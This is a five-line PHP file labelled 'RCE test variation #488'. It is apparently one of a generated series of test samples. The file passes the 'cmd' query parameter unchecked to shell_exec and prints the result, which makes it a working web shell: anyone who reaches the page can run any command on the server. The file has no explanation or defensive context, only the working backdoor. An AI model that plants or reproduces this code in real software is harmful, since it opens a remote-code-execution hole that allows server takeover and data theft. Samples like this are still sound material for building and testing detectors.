<?php
// RCE test variation #488
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>